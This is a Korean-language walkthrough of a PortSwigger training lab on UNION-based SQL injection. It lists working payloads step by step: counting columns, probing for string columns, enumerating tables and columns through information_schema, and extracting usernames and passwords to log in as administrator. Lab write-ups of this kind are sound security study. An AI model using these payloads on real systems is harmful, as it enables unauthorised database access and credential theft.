# Lab: SQL injection UNION attack, retrieving data from other tables

## 개요

- **난이도**: Practitioner
- **주제**: SQL Injection — UNION Attack / 종합
- **링크**: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

## 목표

UNION 공격으로 `users` 테이블의 계정 정보를 추출하여 `administrator`로 로그인한다.

## 분석

이 랩은 007·008에서 다룬 컬럼 수 파악 및 문자열 컬럼 탐색, 005에서 다룬 `information_schema` 기반 구조 탐색을 하나의 흐름으로 연결하는 **종합 실습**이다. 새로운 기법 없이 기존 단계를 순서대로 적용한다.

## 풀이

### 1단계 — 컬럼 수 파악 및 검증

```sql
' ORDER BY 2--
' UNION SELECT NULL,NULL--
```

컬럼 수 **2개** 확인.

### 2단계 — 문자열 출력 가능한 컬럼 확인

```sql
' UNION SELECT 'a','a'--
```

두 컬럼 모두 문자열 출력 가능 확인.

### 3단계 — 테이블 목록 조회

```sql
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--
```

`users` 테이블 확인.

### 4단계 — 컬럼 목록 조회

```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

`username`, `password` 컬럼 확인.

### 5단계 — 계정 정보 추출

```sql
' UNION SELECT username,password FROM users--
```

`administrator` 계정의 비밀번호 확인 후 로그인.

## 핵심 정리

| 단계 | 기법 | 참고 랩 |
|------|------|---------|
| 컬럼 수 파악 | `ORDER BY` / `UNION SELECT NULL` | 007 |
| 문자열 컬럼 탐색 | `'a'` 위치 이동 | 008 |
| 테이블 탐색 | `information_schema.tables` | 005 |
| 컬럼 탐색 | `information_schema.columns` | 005 |
| 데이터 추출 | `UNION SELECT` | 003~006 |

이 랩은 UNION 기반 SQL injection의 전체 흐름을 막힘 없이 실행할 수 있는지 확인하는 문제다.
